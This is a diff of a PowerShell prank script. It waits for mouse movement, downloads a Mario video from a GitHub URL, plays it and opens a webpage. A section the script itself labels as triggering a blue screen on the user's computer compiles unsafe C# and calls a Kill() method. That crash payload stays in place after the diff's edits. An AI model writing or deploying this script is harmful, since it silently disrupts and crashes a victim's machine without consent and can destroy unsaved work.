@@ -27,20 +27,17 @@ while ($true) {
     Start-Sleep -Milliseconds 100
     $null = [Mouse]::GetCursorPos([ref]$point)
     if ($point.X -ne $initialX -or $point.Y -ne $initialY) {
-        # Mouse has moved, download the video
+        # Mouse has moved, download and play the video
         $url = "https://github.com/MajorMarmalade/Sounds/raw/main/Mario/mario.wmv"
         $output = "$env:TEMP\mario.wmv"
         Invoke-WebRequest -Uri $url -OutFile $output
-        # Play the video in fullscreen with VLC
-        Start-Process "C:\Program Files\VideoLAN\VLC\vlc.exe" -ArgumentList "`"$output`" -f"
+        Invoke-Item $output
         # Wait for the video to finish
         Start-Sleep -Seconds 10  # Adjust this to the length of your video
         # Open a webpage
         $webpage = "http://example.com"
         Start-Process $webpage
 
-        # -------------------
-       
 # This section will trigger a BSOD to the users computer
 $source = @"
 using System;
@@ -62,8 +59,6 @@ $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
 $comparams.CompilerOptions = '/unsafe'
 $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
 [CS]::Kill()
-       
- 	# -------------------
 
         break
     }
